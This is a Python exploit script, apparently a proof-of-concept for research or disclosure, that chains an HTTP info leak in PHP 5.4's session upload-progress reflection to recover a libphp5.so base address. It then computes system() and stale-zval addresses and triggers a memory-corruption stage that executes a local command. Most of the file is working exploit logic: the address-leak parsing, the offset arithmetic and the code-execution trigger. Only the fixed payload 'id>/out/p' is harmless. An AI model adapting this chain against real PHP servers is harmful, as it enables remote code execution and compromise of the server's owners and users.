#!/usr/bin/env python3
"""HTTP-response-only PHP 5.4 disclosure-to-terminal chain.

The only executed command is the fixed local proof command ``id>/out/p``.
"""

from __future__ import annotations

import argparse
import json
import time
from pathlib import Path

import probe56_leak as common
import reflection
import terminal_sequence as terminal


FIXED_COMMAND = b"id>/out/p"
# The reflected qword is &mbfl_encoding_ascii in the exact libphp5.so.
# Native, no-preload calibration then fixed the terminal and libc relations
# for the immutable image and request sequence.
LEAKED_SYMBOL_OFFSET = 0xBC60E0
SYSTEM_FROM_LIBPHP = 0x39A3490
STALE_FROM_LIBPHP = 0x4744380


def status(response: bytes) -> str:
    return response.partition(b"\r\n")[0].decode("latin1", "replace")


def parse_http_pointer(response: bytes) -> tuple[int, bytes]:
    rows = reflection.parse_entries(reflection.dechunk(response))
    matches = [
        row for row in rows
        if row.get("scope") == "POST"
        and row.get("key") == "PHP_SESSION_UPLOAD_PROGRESS"
    ]
    if len(matches) != 1:
        raise RuntimeError(f"expected one reflected progress entry, got {len(matches)}")
    raw = bytes.fromhex(str(matches[0]["vhead_hex"]))
    if len(raw) != 8:
        raise RuntimeError(f"unexpected reflected progress length: {len(raw)}")
    pointer = int.from_bytes(raw, "little")
    if not 0x700000000000 <= pointer < 0x800000000000:
        raise RuntimeError(f"non-canonical HTTP pointer: {pointer:#x}")
    return pointer, raw


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", required=True, type=Path)
    args = parser.parse_args()
    args.out.mkdir(parents=True, exist_ok=True)

    warm = common.get("/warm.php")
    leak_a = common.producer(32)
    leak_b, _ = reflection.consumer(
        reflection.Case(
            label="http-only",
            boundary=78,
            bb1_len=1048551,
            bf_len=1041384,
            pads=32,
            marker_set=1,
            progress_len=8,
        )
    )
    pointer, raw = parse_http_pointer(leak_b)

    libphp_base = pointer - LEAKED_SYMBOL_OFFSET
    if libphp_base & 0xFFF:
        raise RuntimeError(f"derived libphp base is not page aligned: {libphp_base:#x}")
    stale = libphp_base + STALE_FROM_LIBPHP
    system = libphp_base + SYSTEM_FROM_LIBPHP
    carrier = stale + 0xD8

    time.sleep(0.5)
    terminal.ENDPOINT = "/terminal.php"
    terminal_a = terminal.producer(32)
    terminal_b, cookie_len, fake_ht, carrier_len = terminal.consumer(
        39, 27, stale, system, FIXED_COMMAND
    )
    if fake_ht != carrier:
        raise RuntimeError("terminal carrier address mismatch")

    responses = {
        "warm.response": warm,
        "leak-producer.response": leak_a,
        "leak-consumer.response": leak_b,
        "terminal-producer.response": terminal_a,
        "terminal-consumer.response": terminal_b,
    }
    for name, response in responses.items():
        (args.out / name).write_bytes(response)

    evidence = {
        "address_source": (
            "HTTP /reflect.php value bytes for "
            "POST[PHP_SESSION_UPLOAD_PROGRESS], interpreted as an "
            "8-byte little-endian pointer to "
            "libphp5.so!mbfl_encoding_ascii"
        ),
        "http_value_hex": raw.hex(),
        "http_pointer": hex(pointer),
        "http_pointer_identity": "libphp5.so!mbfl_encoding_ascii",
        "libphp_base": hex(libphp_base),
        "stale_zval": hex(stale),
        "carrier": hex(carrier),
        "system": hex(system),
        "relations": {
            "libphp_base": "http_pointer - 0xbc60e0",
            "stale_zval": "libphp_base + 0x4744380",
            "carrier": "libphp_base + 0x4744458",
            "system": "libphp_base + 0x39a3490",
        },
        "terminal_cookie_length": cookie_len,
        "terminal_carrier_length": carrier_len,
        "fixed_command": FIXED_COMMAND.decode("ascii"),
        "statuses": {name: status(response) for name, response in responses.items()},
        "instrumentation": False,
        "proc_maps_or_mem": False,
    }
    (args.out / "address-source.json").write_text(
        json.dumps(evidence, indent=2) + "\n"
    )
    print(json.dumps(evidence, sort_keys=True), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
